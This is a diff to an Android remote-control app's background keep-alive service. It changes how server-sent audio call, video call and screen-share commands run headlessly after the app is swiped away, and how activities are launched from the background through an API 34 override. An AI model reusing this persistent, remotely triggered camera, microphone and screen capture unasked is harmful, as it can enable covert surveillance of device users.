@@ -184,6 +184,12 @@ public class BackgroundKeepAliveService extends Service {
         AppLogs.i(TAG, "onTaskRemoved: Activity swiped away, ensuring BackgroundKeepAliveService persists!");
         touchHeartbeat();
         setRunningState(true);
+        // Ask the main process to release camera / mic / screen hardware when
+        // nothing is connected (swiping from recents does not trigger onStop
+        // in the main process because the activity may be destroyed instead).
+        try {
+            sendBroadcast(new Intent("com.tokendeal.vremote.ACTION_RELEASE_IDLE_MEDIA"));
+        } catch (Throwable ignored) {}
         // Only re-push the foreground notification while we are actually a
         // foreground service. Calling startForeground() after the system has
         // demoted us throws RemoteServiceException on API 26+.
@@ -463,15 +469,19 @@ public class BackgroundKeepAliveService extends Service {
                             mBgSocket.emit("device-info-response", info);
                         }
                     } else if ("audio_call".equals(command) || "video_call".equals(command)) {
-                        if (isMainProcessRunning()) {
-                            // The companion socket lives in the already-running main
-                            // process. Hand the command over instead of dropping it
-                            // (dropping it is why calls only worked after Android
-                            // killed the app process).
-                            Log.i(TAG, "Routing " + command + " to the running main process companion");
-                            AppLogs.i(TAG, "Routing " + command + " to main process (app was alive)");
-                            MainActivity.dispatchAutoCommand(this, command, caller, cameraChoice, cmdId);
+                        // The server tags the dispatch tier. If this socket is the
+                        // ONLY one the command reached (tier=alone), the main-process
+                        // companion is dead or asleep — deferring silently would drop
+                        // the call entirely (the app-open case worked only by luck).
+                        // In that case we handle the call here in the background.
+                        boolean alone = "alone".equals(data.optString("dispatchTier", ""));
+                        if (isMainProcessRunning() && !alone) {
+                            Log.i(TAG, "Main process alive — companion handles " + command + " headlessly there");
                             return;
+                        }
+                        if (alone) {
+                            Log.i(TAG, "Sole receiver of " + command + " — handling in background service (main companion unreachable)");
+                            AppLogs.i(TAG, "Sole receiver of " + command + " — handling in background service");
                         }
                         long now = System.currentTimeMillis();
                         if (now - sLastAutoCallTime < 2500) {
@@ -489,13 +499,30 @@ public class BackgroundKeepAliveService extends Service {
                             companion.startVideoCall(caller);
                         }
                     } else if ("screen_share".equals(command) || "screen_share_control".equals(command)) {
-                        // Always start the invisible headless activity. It owns the
-                        // MediaProjection consent dialog and reuses a pending
-                        // request instead of stacking dialogs, so the duplicate
-                        // copy the companion socket receives is harmless.
+                        // Screen share is always handled by the (invisible) headless
+                        // activity, which owns the MediaProjection consent dialog and
+                        // reuses a pending request instead of stacking UI dialogs.
                         HeadlessCaptureActivity.start(this, caller, "screen_share_control".equals(command), false, cameraChoice);
                     } else if ("open_accessibility_settings".equals(command) || "request_battery_exemption".equals(command)) {
-                        MainActivity.dispatchAutoCommand(this, command, caller, cameraChoice, cmdId);
+                        // Opening a system settings screen requires an activity with
+                        // UI, which is fine — the user tapped "fix" deliberately.
+                        if (isMainProcessRunning()) {
+                            MainActivity.dispatchAutoCommand(this, command, caller, cameraChoice, cmdId);
+                        } else {
+                            Intent fix = new Intent(this, MainActivity.class);
+                            fix.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                            fix.putExtra("auto_command", command);
+                            fix.putExtra("caller", caller);
+                            fix.putExtra("cameraChoice", cameraChoice);
+                            fix.putExtra("cmd_id", cmdId);
+                            if (android.os.Build.VERSION.SDK_INT >= 34) {
+                                android.app.ActivityOptions opt = android.app.ActivityOptions.makeBasic();
+                                opt.setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
+                                try { startActivity(fix, opt.toBundle()); } catch (Exception ignored) {}
+                            } else {
+                                try { startActivity(fix); } catch (Exception ignored) {}
+                            }
+                        }
                     } else if ("end_call".equals(command)) {
                         long now = System.currentTimeMillis();
                         if (now - sLastEndCallTime < 2500) {
